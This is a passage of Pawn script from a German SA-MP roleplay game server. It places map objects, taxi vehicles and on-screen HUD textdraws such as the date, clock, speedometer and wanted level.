	CreateDynamicObject(985, -25.12, -2532.43, 35.63, -0.07, -1.44, 299.10);
	CreateDynamicObject(985, -23.18, -2535.90, 35.73, -0.07, -1.44, 298.18);
	CreateDynamicObject(985, -17.69, -2537.58, 35.93, -0.07, -1.44, 24.59);
	CreateDynamicObject(985, -10.59, -2534.17, 36.13, -0.07, -1.44, 26.99);
	CreateDynamicObject(985, -3.58, -2530.58, 36.33, -0.07, -1.44, 26.99);
	CreateDynamicObject(985, 3.36, -2526.92, 36.53, -0.07, -1.44, 28.92);
	CreateDynamicObject(985, 9.07, -2523.92, 36.68, -0.07, -1.44, 27.47);
	CreateDynamicObject(985, 10.64, -2518.63, 36.78, 0.22, 0.00, 297.57);
	CreateDynamicObject(790, 10.02, -2549.02, 43.23, 356.86, 0.00, -0.05);
	CreateDynamicObject(985, -43.90, -2502.56, 36.66, -0.66, 0.48, 304.92);




	// O AMT!
	CreateDynamicObject(979, 928.56067, -1313.11621, 13.30000,   0.00000, 0.00000, -120.00000);
	CreateDynamicObject(979, 923.88824, -1321.19470, 13.30000,   0.00000, 0.00000, -120.00000);
	CreateDynamicObject(979, 916.99664, -1325.14417, 13.30000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(979, 907.63678, -1325.14417, 13.30000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(979, 898.29742, -1325.14417, 13.30000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(979, 888.92828, -1325.14417, 13.30000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(979, 888.92828, -1325.14417, 13.30000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(979, 879.64349, -1325.14417, 13.30000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(979, 870.34943, -1325.14417, 13.30000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(979, 860.98682, -1325.14417, 13.30000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(979, 851.67352, -1325.14417, 13.30000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(979, 844.75879, -1321.16296, 13.30000,   0.00000, 0.00000, 120.00000);
	CreateDynamicObject(979, 840.05652, -1313.07092, 13.30000,   0.00000, 0.00000, 120.00000);
	CreateDynamicObject(19125, 931.08765, -1309.18176, 13.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19125, 921.28931, -1324.91992, 13.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19125, 847.42426, -1324.48352, 13.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19125, 838.08704, -1310.49597, 13.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3864, 842.82281, -1312.52405, 18.50000,   0.00000, 0.00000, 135.00000);
	CreateDynamicObject(3864, 926.02264, -1311.65588, 18.50000,   0.00000, 0.00000, 45.00000);
	CreateDynamicObject(19975, 957.76514, -1313.56067, 12.53750,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19975, 808.42041, -1333.58301, 12.53750,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19975, 935.39465, -1300.21411, 12.53750,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(12930, 915.90887, -1319.29504, 13.30000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2934, 919.76349, -1319.34631, 13.90000,   0.00000, 0.00000, 7080.00000);
	CreateDynamicObject(3620, 852.13861, -1331.43140, 25.50000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2934, 848.22278, -1345.24622, 26.39000,   0.00000, 0.00000, 48.00000);
	CreateDynamicObject(934, 862.60565, -1319.30273, 13.78000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(934, 859.37640, -1319.40491, 13.78000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(934, 860.98175, -1319.36584, 13.78000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18716, 860.62726, -1319.68994, 12.47272,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18716, 859.10895, -1319.34485, 12.44530,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18716, 862.40027, -1319.47729, 12.48216,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3569, 876.86200, -1320.55847, 14.90000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3630, 895.63385, -1321.77368, 14.00000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3630, 897.43201, -1317.55750, 14.00000,   0.00000, 0.00000, 0.00000);


	// O amt neu
	CreateDynamicObject(10788, 886.49500, -1303.89001, 5.90000,   -5.00000, -5.00000, 135.00000);
	CreateDynamicObject(10787, 912.03772, -1373.46606, -3.66200,   -3.00000, -3.00000, 135.00000);
	CreateDynamicObject(10785, 1015.91754, -1405.41443, -6.64000,   0.00000, 4.00000, -92.00000);
	CreateDynamicObject(10784, 994.74847, -1449.00000, -7.99000,   0.00000, 0.00000, -93.50000);
	CreateDynamicObject(10783, 1091.69995, -1452.69995, -7.99000,   0.00000, 0.00000, -93.50000);
	CreateDynamicObject(3095, 886.29730, -1309.16077, 10.68303,   7.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 895.05823, -1318.06970, 9.59361,   7.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 895.05823, -1309.16077, 10.70358,   7.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 877.42010, -1300.27002, 11.80000,   7.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 886.32562, -1300.27002, 11.80000,   7.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 877.42010, -1309.16077, 10.65500,   7.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 877.42010, -1318.06970, 9.57405,   7.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 886.29730, -1318.06970, 9.58044,   7.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 893.06512, -1300.28027, 11.80000,   7.00000, 0.00000, 0.00000);
	CreateDynamicObject(19967, 888.87793, -1274.77515, 14.10000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19967, 897.41541, -1274.81116, 14.10000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(18647, 893.43457, -1322.27246, 7.37580,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(18649, 879.22467, -1322.20959, 7.37580,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19992, 875.35724, -1274.91113, 14.10000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19992, 883.83038, -1274.60376, 14.10000,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19425, 877.37042, -1281.54810, 11.56870,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 895.22028, -1281.54810, 11.56870,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 881.35596, -1281.54810, 11.56874,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19425, 891.25043, -1281.54810, 11.56870,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19355, 946.46259, -1401.42822, -8.50000,   4.00000, 0.00000, 0.00000);
	CreateDynamicObject(19355, 946.48254, -1404.28662, -8.50000,   4.00000, 0.00000, 0.00000);
	CreateDynamicObject(19355, 946.46259, -1401.68005, -5.05000,   4.00000, 0.00000, 0.00000);
	CreateDynamicObject(19355, 946.46259, -1401.68005, -5.10000,   4.00000, 0.00000, 0.00000);
	CreateDynamicObject(19355, 946.46259, -1404.53003, -5.05000,   4.00000, 0.00000, 0.00000);
	CreateDynamicObject(18652, 950.61261, -1396.43103, -3.00000,   5.00000, 0.00000, 0.00000);
	CreateDynamicObject(18652, 951.47858, -1409.89648, -4.00000,   5.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 1040.00000, -1459.64282, -8.97000,   0.00000, -90.00000, -3.50000);
	CreateDynamicObject(3095, 1043.18091, -1467.69116, -5.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 1038.64319, -1474.55737, -8.97000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(10781, 1094.52625, -1363.47327, -5.87000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(10782, 948.21283, -1336.89136, -5.80000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7244, 1192.30005, -1489.80920, -13.15000,   0.00000, 0.00000, 177.00000);
	CreateDynamicObject(3095, 1167.22864, -1517.38647, -8.00000,   0.00000, 90.00000, 50.00000);
	CreateDynamicObject(19810, 1142.16101, -1467.50000, -9.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19810, 1142.07532, -1477.09167, -9.00000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3095, 1142.16589, -1463.66663, -10.70700,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3095, 1142.42908, -1512.70886, -8.00000,   0.00000, 90.00000, 87.00000);
	CreateDynamicObject(3095, 1151.03625, -1513.65784, -8.00000,   0.00000, 90.00000, 87.00000);
	CreateDynamicObject(3095, 1159.76038, -1514.48657, -8.00000,   0.00000, 90.00000, 87.00000);
	CreateDynamicObject(3095, 1085.11646, -1416.94885, -7.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3095, 1085.11646, -1399.11047, -7.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3095, 1085.11646, -1407.91357, -7.00000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3095, 1055.77747, -1347.41895, -5.00000,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(3095, 919.45959, -1363.04395, -5.00000,   0.00000, -90.00000, 0.00000);
	CreateDynamicObject(3095, 1146.66113, -1472.14453, -5.60000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 1146.66113, -1472.14453, -5.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3095, 1146.66113, -1472.14453, -4.62000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3627, 835.19794, -1169.08398, 18.94712,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1676, 850.59900, -1169.73242, 17.48000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 850.10309, -1169.75085, 16.45000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(936, 846.78271, -1160.58862, 16.40000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19797, 924.91974, -1211.67615, 23.49290,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19797, 925.07831, -1230.39075, 23.49290,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19899, 844.08136, -1160.45166, 15.99000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19815, 847.00488, -1160.07837, 17.68784,   0.00000, 0.00000, -2.04000);
	CreateDynamicObject(5737, 822.37225, -1250.44568, 18.50000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19650, 834.88300, -1250.65808, 13.56360,   0.00000, 0.00000, 1.50000);
	CreateDynamicObject(1504, 833.99902, -1247.19556, 13.70000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(12950, 823.34137, -1236.77234, 16.80000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(12950, 829.36072, -1236.77234, 21.30000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(12950, 817.10828, -1236.77234, 12.00000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(970, 834.69733, -1238.12048, 24.99000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3928, 828.45349, -1257.94519, 24.54900,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3928, 814.26147, -1241.29553, 24.54900,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(12950, 837.17578, -1278.40002, 24.65000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(12950, 831.02222, -1278.40002, 20.00000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(12950, 825.12701, -1278.40002, 15.50000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(12950, 819.00037, -1278.46899, 10.90000,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3928, 812.28650, -1302.30103, 27.99000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3928, 812.21057, -1284.23389, 27.99000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3928, 838.56378, -1302.32031, 27.99000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18762, 873.89368, -1277.14380, 13.13180,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 874.85553, -1277.14880, 13.13180,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 873.89905, -1282.10889, 12.93334,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 874.88910, -1282.08679, 12.93334,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 873.90753, -1287.05933, 12.73334,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 874.74786, -1287.02612, 12.73334,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 873.90765, -1292.02319, 12.54056,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 874.74670, -1292.01111, 12.52334,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 874.73322, -1293.49390, 12.46349,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 873.92224, -1293.37207, 12.46349,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(18762, 898.02039, -1293.36365, 12.33842,   92.27650, 0.00000, 0.00000);
	CreateDynamicObject(3578, 892.49500, -1274.63452, 12.96358,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3578, 882.26196, -1274.63855, 12.96358,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3578, 880.18158, -1274.64490, 12.96358,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 850.09949, -1173.87183, 16.45000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 851.18982, -1173.78198, 16.45000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 851.18719, -1169.69922, 16.45000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1676, 850.61279, -1173.45605, 17.48000,   0.00000, 0.00000, 90.00000);







	TaxiVehs[1] = AddStaticVehicle(420,1061.5389,-1773.7249,13.1268,360.0000,6,7); //
	TaxiVehs[2] = AddStaticVehicle(420,1064.6201,-1773.7249,13.1268,360.0000,6,7); //
	TaxiVehs[3] = AddStaticVehicle(420,1069.0760,-1773.7249,13.1268,360.0000,6,7); //
	TaxiVehs[4] = AddStaticVehicle(420,1074.5365,-1773.7249,13.1268,360.0000,6,7); //
	TaxiVehs[5] = AddStaticVehicle(420,1079.0901,-1773.7249,13.1268,360.0000,6,7); //
	TaxiVehs[6] = AddStaticVehicle(420,1082.1819,-1773.7250,13.1487,359.9934,6,7); //
	TaxiVehs[7] = AddStaticVehicle(420,1089.6844,-1773.7252,13.1487,359.9934,6,7); //
	TaxiVehs[8] = AddStaticVehicle(420,1093.7463,-1773.7253,13.1487,359.9934,6,7); //
	TaxiVehs[9] = AddStaticVehicle(420,1098.2809,-1773.7255,13.1487,359.9934,6,7); //


	for(new i = 0; i < MAX_VEHICLES; i++)
	{
		if(IsATaxiFahrzeug(i))
		{
		    taxi3dtext[i] = Create3DTextLabel( "Taxi Company\n\nSteige sie ein, um als\nTaxifahrer zu arbeiten.", COLOR_YELLOW, 0.0, 0.0, 0.0, 25.0, 0, 1 );
		    Attach3DTextLabelToVehicle(taxi3dtext[i],TaxiVehs[i],0.0, 0.0, 0.0);
		}
	}


	// O amt neu
	CreateDynamicObject(5838, 860.38373, -1289.25146, 29.00779,   356.85840, 0.00000, 3.14159);
	CreateDynamicObject(5836, 920.80536, -1182.27405, 26.48232,   356.85840, 0.00000, 3.14159);


	// Ordnungsamt
	otor1 = CreateDynamicObject(980, 923.48230, -1216.51563, 18.70460,   0.00000, 0.00000, 270.00000);
	otor2 = CreateDynamicObject(980, 923.47284, -1225.36877, 18.70460,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1533, 860.54181, -1241.52271, 13.69752,   0.00000, 0.00000, 90.00001);// Tür
	CreateDynamicObject(2420, 923.30762, -1208.27222, 15.94833,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2420, 923.04663, -1210.71179, 15.94830,   0.00000, 0.00000, 1799821.25000);

	// Savebox
	CreateDynamicObject(2332, 837.04510, -1852.74292, 7.83975,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2332, 1298.18994, -985.38837, 32.09094,   0.00000, 0.00000, -89.70004);
	CreateDynamicObject(2332, 1097.73157, 1675.44006, 5.15633,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2332, -1480.28186, 315.40509, 6.54263,   0.00000, 0.00000, 90.24002);



	// FBI Interior Türen
	CreateDynamicObject(1537, 213.65558, 122.94633, 997.98352,   0.00000, 0.00000, 90.00003);
	CreateDynamicObject(1537, 213.67308, 121.45974, 997.98352,   0.00000, 0.00000, 90.00003);


	// LVPD Interior
	CreateDynamicObject(1533, 232.08009, 182.31230, 1002.02655,   0.00000, 0.00000, -90.00002);
	CreateDynamicObject(1533, 232.08148, 183.79712, 1002.02655,   0.00000, 0.00000, -90.00002);


//HIERHIN


	new year;
	new month;
	new day;
	new mtext[20], dtext[20];
	getdate(year, month, day);
	if(month == 1) { mtext = "01"; }
	else if(month == 2) { mtext = "02"; }
	else if(month == 3) { mtext = "03"; }
	else if(month == 4) { mtext = "04"; }
	else if(month == 5) { mtext = "05"; }
	else if(month == 6) { mtext = "06"; }
	else if(month == 7) { mtext = "07"; }
	else if(month == 8) { mtext = "08"; }
	else if(month == 9) { mtext = "09"; }
	else if(month == 10) { mtext = "10"; }
	else if(month == 11) { mtext = "11"; }
	else if(month == 12) { mtext = "12"; }
	if(day == 1) { dtext = "01"; }
	else if(day == 2) { dtext = "02"; }
	else if(day == 3) { dtext = "03"; }
	else if(day == 4) { dtext = "04"; }
	else if(day == 5) { dtext = "05"; }
	else if(day == 6) { dtext = "06"; }
	else if(day == 7) { dtext = "07"; }
	else if(day == 8) { dtext = "08"; }
	else if(day == 9) { dtext = "09"; }
	else if(day == 10) { dtext = "10"; }
	else if(day == 11) { dtext = "11"; }
	else if(day == 12) { dtext = "12"; }
	else if(day == 13) { dtext = "13"; }
	else if(day == 14) { dtext = "14"; }
	else if(day == 15) { dtext = "15"; }
	else if(day == 16) { dtext = "16"; }
	else if(day == 17) { dtext = "17"; }
	else if(day == 18) { dtext = "18"; }
	else if(day == 19) { dtext = "19"; }
	else if(day == 20) { dtext = "20"; }
	else if(day == 21) { dtext = "21"; }
	else if(day == 22) { dtext = "22"; }
	else if(day == 23) { dtext = "23"; }
	else if(day == 24) { dtext = "24"; }
	else if(day == 25) { dtext = "25"; }
	else if(day == 26) { dtext = "26"; }
	else if(day == 27) { dtext = "27"; }
	else if(day == 28) { dtext = "28"; }
	else if(day == 29) { dtext = "29"; }
	else if(day == 30) { dtext = "30"; }
	else if(day == 31) { dtext = "31"; }
	Datum = TextDrawCreate(546.000000, 14.000000, " ");
	TextDrawBackgroundColor(Datum, 255);
	TextDrawFont(Datum, 2);
	TextDrawLetterSize(Datum, 0.300000, 1.200000);
	TextDrawColor(Datum, -1);
	TextDrawSetOutline(Datum, 1);
	TextDrawSetProportional(Datum, 1);
    format(ALLSTRING, sizeof(ALLSTRING), "%s.%s.%d", dtext, mtext, year);
    TextDrawSetString(Datum,ALLSTRING);
    TextDrawShowForAll(Datum);


	NDMZONET = TextDrawCreate(497.000000,7.000000,"NO DM ZONE");
	TextDrawAlignment(NDMZONET,0);
	TextDrawBackgroundColor(NDMZONET,0x000000FF);
	TextDrawFont(NDMZONET,2);
	TextDrawLetterSize(NDMZONET,0.499999,1.500000);
	TextDrawColor(NDMZONET,0xFF0000FF);
	TextDrawSetOutline(NDMZONET,1);
	TextDrawSetProportional(NDMZONET,1);
	TextDrawSetShadow(NDMZONET,1);



	Copyright = TextDrawCreate(27.000000, 424.000000, "www.gta.de");
	TextDrawBackgroundColor(Copyright, 255);
	TextDrawFont(Copyright, 2);
	TextDrawLetterSize(Copyright, 0.340000, 1.600000);
	TextDrawColor(Copyright, -1);
	TextDrawSetOutline(Copyright, 1);
	TextDrawSetProportional(Copyright, 1);
	TextDrawShowForAll(Copyright);

	txtAnimHelper = TextDrawCreate(610.0, 400.0,"Sprinttaste, um abzubrechen");
	TextDrawUseBox(txtAnimHelper, 0);
	TextDrawFont(txtAnimHelper, 2);
	TextDrawSetShadow(txtAnimHelper,0);
    TextDrawSetOutline(txtAnimHelper,1);
    TextDrawBackgroundColor(txtAnimHelper,0x000000FF);
    TextDrawColor(txtAnimHelper,0xFFFFFFFF);
    TextDrawAlignment(txtAnimHelper,3);

	Uhrzeit = TextDrawCreate(554.000000, 30.000000, " ");
	TextDrawBackgroundColor(Uhrzeit, 255);
	TextDrawFont(Uhrzeit, 2);
	TextDrawLetterSize(Uhrzeit, 0.390000, 1.300000);
	TextDrawColor(Uhrzeit, -1);
	TextDrawSetOutline(Uhrzeit, 1);
	TextDrawSetProportional(Uhrzeit, 1);
	TextDrawShowForAll(Uhrzeit);

//







	for(new i=0; i<SLOTS; i++)
	{


	    WantedTextdraw[i] = TextDrawCreate(499.000000, 102.000000, "] ~w~0");
		TextDrawBackgroundColor(WantedTextdraw[i], 255);
		TextDrawFont(WantedTextdraw[i], 2);
		TextDrawLetterSize(WantedTextdraw[i], 0.480000, 2.000000);
		TextDrawColor(WantedTextdraw[i], 0xFFA000FF);
		TextDrawSetOutline(WantedTextdraw[i], 1);
		TextDrawSetProportional(WantedTextdraw[i], 1);

		TDEditor_TD[i] = TextDrawCreate(28.400045, 316.435302, "Supporter_Modus~n~");
		TextDrawLetterSize(TDEditor_TD[i], 0.400000, 1.600000);
		TextDrawAlignment(TDEditor_TD[i], 1);
		TextDrawColor(TDEditor_TD[i], -1);
		TextDrawSetShadow(TDEditor_TD[i], 0);
		TextDrawSetOutline(TDEditor_TD[i], 0);
		TextDrawBackgroundColor(TDEditor_TD[i], 255);
		TextDrawFont(TDEditor_TD[i], 1);
		TextDrawSetProportional(TDEditor_TD[i], 1);
		TextDrawSetShadow(TDEditor_TD[i], 0);


		Textdraw10[i] = TextDrawCreate(493.199981, 437.055541, "usebox");
		TextDrawLetterSize(Textdraw10[i], 0.000000, -8.170494);
		TextDrawTextSize(Textdraw10[i], 600.799987, 0.000000);
		TextDrawAlignment(Textdraw10[i], 1);
		TextDrawColor(Textdraw10[i], 0);
		TextDrawUseBox(Textdraw10[i], true);
		TextDrawBoxColor(Textdraw10[i], 102);
		TextDrawSetShadow(Textdraw10[i], 0);
		TextDrawSetOutline(Textdraw10[i], 0);
		TextDrawFont(Textdraw10[i], 0);


		Textdrawaisahuso[i] = TextDrawCreate(258.000061, 3.318513, "Verwende /music um Musik zu hören!");// yo geht bestimmt nicht
		TextDrawLetterSize(Textdrawaisahuso[i], 0.424999, 1.488000);
		TextDrawAlignment(Textdrawaisahuso[i], 1);
		TextDrawColor(Textdrawaisahuso[i], -1);
		TextDrawSetShadow(Textdrawaisahuso[i], 0);
		TextDrawSetOutline(Textdrawaisahuso[i], 1);
		TextDrawBackgroundColor(Textdrawaisahuso[i], 51);
		TextDrawFont(Textdrawaisahuso[i], 1);
		TextDrawSetProportional(Textdrawaisahuso[i], 1);



		Speedo[i] = TextDrawCreate(498.000000, 373.000000, " ");
		TextDrawBackgroundColor(Speedo[i], 255);
		TextDrawFont(Speedo[i], 1);
		TextDrawLetterSize(Speedo[i], 0.32, 1.000000);
		TextDrawColor(Speedo[i], -1);
		TextDrawSetOutline(Speedo[i], 0);
		TextDrawSetProportional(Speedo[i], 1);
		TextDrawSetShadow(Speedo[i], 1);

		tacho[i] = TextDrawCreate(498.000000, 418.000000, " ");
		TextDrawBackgroundColor(tacho[i],255);
		TextDrawFont(tacho[i],1);
		TextDrawLetterSize(tacho[i],0.32,1.000000);
		TextDrawColor(tacho[i],-1);
		TextDrawSetOutline(tacho[i],0);
		TextDrawSetProportional(tacho[i],1);
		TextDrawSetShadow(tacho[i], 1);
	}




// Zollstation
CreateDynamicObject(9623, 106.15792, -1275.25623, 16.31107,   2.73180, 0.00000, -54.84000);
CreateDynamicObject(9623, 91.41440, -1254.12402, 16.35979,   1.36590, 0.00000, -56.52000);

zolltor9 = CreateDynamicObject(978, 86.22680, -1251.81213, 14.27388,   0.00000, 0.00000, -57.72001);
zolltor10 = CreateDynamicObject(978, 96.14687, -1255.90833, 14.34753,   0.00000, 0.00000, 120.83997);
zolltor11 = CreateDynamicObject(978, 101.65186, -1272.34497, 14.31233,   0.00000, 0.00000, -53.40000);
zolltor12 = CreateDynamicObject(978, 110.51665, -1277.13660, 14.40798,   0.00000, 0.00000, 124.38004);



// ATMs
CreateDynamicObject(2942, 732.40149, -1346.81604, 13.10907,   0.00000, 0.00000, 89.46004);
CreateDynamicObject(2942, 549.33990, -1260.54529, 16.40424,   0.00000, 0.00000, -145.44005);
CreateDynamicObject(2942, 2131.66577, -1151.33582, 23.68833,   0.00000, 0.00000, 180.65993);
CreateDynamicObject(2942, 2266.11230, 2031.79199, 10.45267,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2942, -1967.21179, 278.57965, 34.80096,   0.00000, 0.00000, -90.05998);
CreateDynamicObject(2942, -1648.64197, 1202.48474, 6.85216,   0.00000, 0.00000, 179.63994);


// Fahrzeuglackiererei Landeplatz
CreateDynamicObject(3928, 1041.71802, 2131.57275, 9.84601,   0.00000, 0.00000, 0.00000);

// FBI base ...
CreateDynamicObject(19794, 1787.12598, -1565.69983, 11.95527,   0.00000, 0.00000, 0.00000);

// YG. 2.0 Map
CreateDynamicObject(19425, 1500.58887, -1729.79407, 12.36744,   0.00000, 0.00000, 91.63201);
CreateDynamicObject(19425, 1500.71045, -1734.83398, 12.36744,   0.00000, 0.00000, 91.63201);
CreateDynamicObject(19425, 1462.26038, -1729.80554, 12.36744,   0.00000, 0.00000, 91.63201);
CreateDynamicObject(19425, 1462.38464, -1734.72656, 12.36744,   0.00000, 0.00000, 91.63201);
CreateDynamicObject(1211, 1519.70068, -1725.29749, 13.11540,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1211, 1440.79822, -1725.68311, 13.09540,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1211, 1407.54749, -1738.41870, 13.07540,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1211, 1559.29114, -1739.85779, 13.03540,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1211, 1523.54834, -1615.31287, 13.03375,   0.00000, 0.00000, 85.71249);
CreateDynamicObject(1211, 1538.50610, -1600.09705, 13.03375,   0.00000, 0.00000, 85.71249);
CreateDynamicObject(1211, 1490.69165, -1598.11646, 13.03375,   0.00000, 0.00000, 85.71249);
CreateDynamicObject(1211, 1438.32947, -1600.01782, 13.03375,   0.00000, 0.00000, 85.71249);
CreateDynamicObject(1211, 1423.52368, -1641.68079, 13.03375,   0.00000, 0.00000, 85.71249);
CreateDynamicObject(1211, 1419.46765, -1722.11023, 13.03375,   0.00000, 0.00000, 85.71249);
CreateDynamicObject(1211, 1356.63745, -1740.01025, 13.03375,   0.00000, 0.00000, 85.71249);
CreateDynamicObject(1363, 1339.70752, -1752.43787, 13.15770,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1363, 1399.21313, -1742.40088, 13.15770,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1363, 1453.61414, -1744.14966, 13.15770,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1363, 1519.58276, -1650.37671, 13.15770,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1363, 1520.45471, -1699.06702, 13.15770,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1366, 1349.51257, -1722.61743, 13.04250,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1340.87646, -1742.52637, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1341.03467, -1748.70117, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1341.13220, -1755.72253, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1347.25146, -1756.46594, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1355.51648, -1756.40552, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1361.31995, -1756.09753, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1361.29236, -1751.45190, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1361.32458, -1747.26892, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1356.81824, -1746.87219, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19121, 1351.98914, -1742.21790, 13.09210,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(910, 1337.17749, -1760.73767, 13.69941,   0.00000, 0.00000, 90.78064);
CreateDynamicObject(852, 1339.65039, -1766.60474, 12.53101,   0.00000, 0.00000, 0.96194);
CreateDynamicObject(1264, 1341.89917, -1767.40283, 12.88300,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1265, 1341.67542, -1766.34167, 12.95800,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1327, 1336.69446, -1770.71741, 13.37210,   360.00000, 171.00000, 0.00000);
CreateDynamicObject(1299, 1341.41516, -1784.46106, 12.83100,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1355, 1337.12146, -1759.49158, 12.70250,   0.00000, 0.00000, 0.00000);
